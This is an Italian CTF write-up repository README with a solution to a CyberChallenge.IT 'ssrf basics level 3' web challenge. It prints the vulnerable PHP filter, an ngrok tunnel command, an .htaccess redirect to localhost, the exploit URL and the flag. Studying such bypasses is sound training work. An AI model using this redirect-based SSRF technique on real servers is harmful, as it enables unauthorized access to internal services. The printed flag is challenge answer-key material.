# CTF Writeups & HTB Machines 💀

In questo repository archiviamo tutte le writeups di CTF (Capture The Flag) e macchine HTB (Hack The Box) che ho completato.

## Contenuti 📚
- **CTF Writeups**: Soluzioni dettagliate delle sfide CTF
- **HTB Machines**: Guide complete per le macchine Hack The Box

## Contributi 🤝
Per contribuire con un writeup, contattami via email: `luca.crippa05@gmail.com`

## Licenza ⚖️
Repository condivisa per scopi educativi. Rispetta sempre le policy delle piattaforme quando condividi materiale.

---

# Writeup: WS_1.05 - ssrf basics - level 3

## Overview
- **Categoria:** Web
- **Autore:** bonaff
- **Difficoltà:** 491
- **Stato:** Up (last checked: 15 minutes ago)
- **URL:** [http://ssrf3.challs.cyberchallenge.it/](http://ssrf3.challs.cyberchallenge.it/)

## Descrizione 📝
Il terzo livello della challenge SSRF introduce un controllo più sofisticato rispetto ai livelli precedenti. In questo caso, il server esegue diverse verifiche sull'URL passato tramite il parametro `url`, tra cui:

- Validazione del formato dell'URL.
- Controllo dello schema (accettati solo `http` e `https`).
- Risoluzione dell'host per ottenere il vero indirizzo IP.
- Verifica con la funzione `cidr_match` per bloccare indirizzi locali (es. `127.0.0.1/8` e `0.0.0.0/32`).

Il codice rilevante è il seguente:
```php
function cidr_match($ip, $range){
    list ($subnet, $bits) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask; // in case the supplied subnet was not correctly aligned
    return ($ip & $mask) == $subnet;
}

if(isset($_GET['url']) && !is_array($_GET['url'])){
    $url = $_GET['url'];
    if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
        die('Not a valid URL');
    }
    $parsed = parse_url($url);
    $host = $parsed['host'];
    if (!in_array($parsed['scheme'], ['http','https'])){
        die('Not a valid URL');
    }
    $true_ip = gethostbyname($host);
    if(cidr_match($true_ip, '127.0.0.1/8') || cidr_match($true_ip, '0.0.0.0/32')){
        die('Not a valid URL');
    }
    echo file_get_contents($url);
    return;
}
```
Per aggirare questi controlli, è necessario un approccio indiretto che sfrutti un reindirizzamento controllato.

## Soluzione 🎯

### 1. Configurazione del Reindirizzamento
Per bypassare le restrizioni, si è utilizzato un tunnel ngrok e la configurazione di Apache tramite il file `.htaccess`:
- **Ngrok:** Avvia un tunnel per esporre una porta locale a internet:
  ```bash
  ngrok http 80
  ```
  Questo fornisce un URL pubblico, ad es. `https://your-id.ngrok-free.app`.

- **.htaccess:** Configura Apache in modo che ogni richiesta venga reindirizzata a `http://localhost/get_flag.php`:
  ```apache
  RewriteEngine On
  RewriteRule ^(.*)$ http://localhost/get_flag.php [R=302,L]
  ```

### 2. Esecuzione dell'Exploit
Una volta configurato il tunnel e il file `.htaccess`, è sufficiente inviare una richiesta al livello 3 della challenge con il parametro `url` impostato sull'URL di ngrok:
```
http://ssrf3.challs.cyberchallenge.it/?url=https://your-id.ngrok-free.app
```
Il server, dopo aver validato l'URL (che non risulta appartenere agli indirizzi locali grazie al nome di dominio ngrok), effettua una richiesta a `https://your-id.ngrok-free.app`. A questo punto, il file `.htaccess` reindirizza la richiesta a `http://localhost/get_flag.php`, restituendo il contenuto della flag.

### 3. Ottenimento della Flag
Visitando l'URL sopra, il server risponde con:

## Flag 🏁
```
CCIT{388d0c8b92b617986eb3ba95a07b7342}
```

## Lezioni Apprese 📚
- **Validazione degli IP:** Anche controlli sofisticati come `cidr_match` possono essere bypassati se combinati con reindirizzamenti esterni.
- **Utilizzo di Tunnel:** Ngrok e altri strumenti simili permettono di esporre servizi locali e aggirare filtri basati sull'indirizzo IP.
- **Importanza dei Reindirizzamenti:** La configurazione errata o non adeguatamente protetta dei reindirizzamenti può compromettere la sicurezza del server.

## Tools Utilizzati 🛠️
- **Browser Web:** Per inviare richieste e verificare le risposte.
- **Ngrok:** Per creare un tunnel pubblico e bypassare i controlli IP.
- **Apache .htaccess:** Per configurare il reindirizzamento interno.
- **Terminale Linux:** Per eseguire comandi e configurare l'ambiente di test.

---

*Writeup by Luca Crippa - Last Updated: 2024*
